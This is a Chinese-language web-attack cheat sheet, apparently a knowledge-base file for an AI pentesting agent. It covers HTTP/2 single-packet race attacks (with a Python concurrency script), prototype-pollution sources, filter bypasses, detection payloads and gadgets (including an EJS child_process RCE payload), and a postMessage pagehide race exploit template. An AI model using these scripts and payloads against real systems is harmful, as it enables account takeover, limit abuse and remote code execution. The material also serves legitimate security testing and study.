# Web 竞态条件与原型链污染 — 单包攻击与 Gadget 速查

> 当遇到竞态条件（含客户端消息/文档切换竞态）或原型链污染（PP）场景时通过 Read 工具加载。
> client-side 攻击见 `$AGENT_DIR/knowledge-base/client-side-attacks.md`。

## §1 单包攻击（Single-Packet Attack）

> James Kettle (PortSwigger) 2023 提出，把 HTTP/2 并发竞态从"碰运气"变成"可靠可复现"。

### 原理
把 20-30 个 HTTP/2 请求**预发主体**（发除最后一字节外的全部 data frame），靠 Nagle 算法打包进同一 TCP 包，最后**一次性发出所有保留帧** → 同包到达，彻底消除网络抖动。

### 适用场景
- **limit-overrun**: 优惠码/礼品码"限用一次"→ 同时发多个重复使用
- **单端点碰撞**: 同一请求的两个实例同时修改同一资源（如 Devise CVE-2022-4037：同时改邮箱到两个地址，收件人用实例变量但 token 从 DB 重读 → 邮件发错地址但 token 有效）
- **多端点碰撞**: 不同端点共享同一状态
- **密码重置接管**: 同时用两个 token 触发重置
- **partial-construction（部分构造）**: 对象分多步创建（如注册先建 user 行再单独写 password），中间态未初始化。用能匹配未初始化值的输入（JSON `null` / PHP 空数组）命中中间态 → 密码重置/登录绕过

### 操作步骤（HTTP/2 单包攻击脚本）

原理: 所有请求的 HTTP/2 帧在同一 TCP 分组内到达，绕过服务端竞态窗口。python 模板（httpx h2 单连接多流并发）:
```python
import httpx, asyncio
async def one(c, i):
    return await c.post(URL, json={"coupon": f"C{i}", "user": UID})
async def main():
    async with httpx.AsyncClient(http2=True) as c:  # 单连接多流=帧聚合
        rs = await asyncio.gather(*[one(c, i) for i in range(30)])
        [print(r.status_code, r.text[:60]) for r in rs]
asyncio.run(main())
```
HTTP/1.1 目标退而求其次: 多连接同毫秒并发（线程池 simultaneously 发出）或单连接 keep-alive 流水线连续写。

### 方法论
1. 预测潜在碰撞对象（哪些操作共享状态）
2. 探测异常（响应/耗时/二阶邮件差异）
3. 精简到 2 请求验证
4. 不支持 HTTP/2 时退回 **last-byte sync**（20 个 TCP 连接预发，同时发最后字节）
5. **多端点速度不一致时**: 故意大量发垃圾请求触发服务端 leaky-bucket 限流，让服务端自行延迟快端点 → 单包仍成立（客户端不延迟）

## §2 原型链污染（Prototype Pollution）

> JavaScript 递归 merge 不清洗 `__proto__` 键 → 污染 `Object.prototype` → 下游 gadget 读取。

### Sources（污染入口）
| 来源 | 示例 |
|------|------|
| URL query | `?__proto__[x]=y` |
| JSON | `{"__proto__": {"x": "y"}}` |
| Web message | `postMessage({__proto__: {...}})` |

### 绕过 key 过滤
```
__proto__ → %5f%5fproto%5f%5f（URL 编码）
__proto__ → constructor.prototype（绕 __proto__ 黑名单）
```

### Server-side 检测（无反射时）
| 方法 | 原理 | 成功标志 |
|------|------|---------|
| JSON spaces override | `__proto__[json spaces]=7` | 响应 JSON 缩进从 2 变 7 |
| Status code override | `__proto__[status]=555` | 响应状态码变 555 |
| Charset Override | `__proto__[charset]=UTF-7` | 响应 charset 变化 |

### Client-side 检测
PP 源与 gadget 静态挖掘: 全部 JS `grep -nE "location\.(hash|search|href)|window\.name|\.message" *.js` 找源，再追赋值链到 sink（innerHTML/src/eval）——源到 sink 无净化即候选。

### 常见 Gadgets 速查
| Gadget | 库/场景 | 利用 |
|--------|--------|------|
| `transport_url` / `src` | 通用 `<script src>` 配置 | 污染 → 加载攻击者 JS → XSS |
| `baseURL` / `headers` | **axios** | 污染 baseURL → 控制请求目标 |
| `execArgv` / `execPath` / `env` | **child_process.fork/execSync** | 污染 → RCE |
| `shell` | **child_process** | `__proto__[shell]=node` → 通过 NODE_OPTIONS RCE |
| `html` / `template` | 模板引擎（EJS/Pug/Hogan） | 污染 → SSTI → RCE |
| `outputFunctionName` | **EJS** | `__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('...')//` |
| `headers`（通用） | **fetch()** / 任何读 Object 的请求库 | 污染 → 所有请求带攻击者 header（比 axios baseURL 更通用） |

### RCE 链（Server-side PP → RCE）
```
1. 找到 PP source（URL/JSON）
2. 确认 PP 生效（JSON spaces/status/charset override 检测）
3. 找 gadget: grep merge/assign/deparam + child_process/template engine
4. 污染 gadget 属性 → 触发 RCE
```

## §3 服务端竞态排查清单

| 场景 | 排查方向 |
|------|---------|
| 礼品码/优惠码 | 同时提交多次看是否重复使用 |
| 邮箱确认/密码重置 | 同时改到两个地址，看邮件/token 是否错配 |
| 余额/积分 | 同时消费看是否双花 |
| 文件上传 | 同时上传同名文件看是否覆盖竞争 |
| PHP session 锁 | PHP 默认 session 文件锁串行化 → 换不同 session 或不同 cookie |
| 数据库事务 | 隔离级别不足 → check-then-act 非原子 |

## §4 客户端文档生命周期竞态：消息跨文档切换投递

> 一句话：消息从发出到被处理之间有排队延迟，这段时间里 iframe 可能已经换了文档——利用这个时间差，可以让消息送达时的"发送者身份比较"变成不相等，从而通过校验。
>
> 触发场景：消息处理函数用"发送者身份比较"做校验（如 `e.source === iframe.contentWindow`），该 iframe 内的文档可能会被替换（跳转到另一个页面）。

### 机制

- 消息里的 `e.source`（发送方窗口的引用）在**投递时**求值：源文档仍存活 → 指向该发送窗口；**源文档已销毁 → `null`**；而接收方读取 `iframe.contentWindow` 时，读到的是**消息送达的那一刻** iframe 里当前的窗口（稳定的窗口引用，指向当前文档）。
- 消息不是立刻送达的，要排队等待处理；排队期间，iframe 的文档可能已经被换掉（导航或替换）。
- 如果消息正好是在旧文档**卸载的瞬间**发出的（`pagehide` 的监听处理函数里调用 `postMessage` 发消息），那么它会先进入队列，等文档切换完成、新文档生效之后才送达。送达时，`iframe.contentWindow` 已经指向新文档的窗口，而这条消息的 `e.source` 已经是 `null`（投递时源文档已销毁）——`null` 不等于任何窗口引用，两者不再相等。

### 检查方法（对照实验）

同一个脚本里并排跑两组，接收方记录每次比较的结果：

```js
// target = 持有校验代码的窗口引用（校验在父窗口时用 parent，在顶层窗口时用 top）
// A 组：页面存活期间高频发送（预期：比较为 true → 被跳过）
setInterval(() => target.postMessage({a: 1}, "*"), 1);
// B 组：在卸载瞬间发送（预期：比较为 false → 进入处理分支）
addEventListener("pagehide", () => target.postMessage({b: 1}, "*"));
// 接收端（校验代码所在页面）加一行判别打印：
addEventListener("message", (e) => console.log("eq=" + (e.source === iframe.contentWindow), "srcNull=" + (e.source === null)));
```

判读：B 组出现比较结果为 false（同时打印 `srcNull=true`）说明竞态成立。两组必须在同一个脚本里并排运行——只跑 A 组的话，会误以为"比较永远相等"。

父页面用 `addEventListener("message", (e) => ...)` 监听 iframe 发来的消息，并在处理函数里比较 `e.source === iframe.contentWindow`。对照实验的观察结果：iframe 页面存活期间发送时——比较始终相等；iframe 在 `pagehide`（卸载瞬间）发送消息时——这条消息跨越文档切换后才被送达，此时 `e.source` 为 `null`，比较变为不等。

### 利用模板

```js
addEventListener("pagehide", function () { try { top.postMessage({p: 1}, "*"); } catch (e) {} });
```

- `top` 是持有校验代码的窗口引用（如果校验在父窗口，换成 `parent`）；消息内容任意。
- 前置条件：接收方已经进入"等待换页"阶段（例如某个状态变量已经置位），并且消息被处理时仍处于该阶段。

## §5 关联文件

- `$AGENT_DIR/knowledge-base/client-side-attacks.md` — 客户端攻击（bfcache/CSS exfil/xsleak）
- `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — 服务端漏洞模式
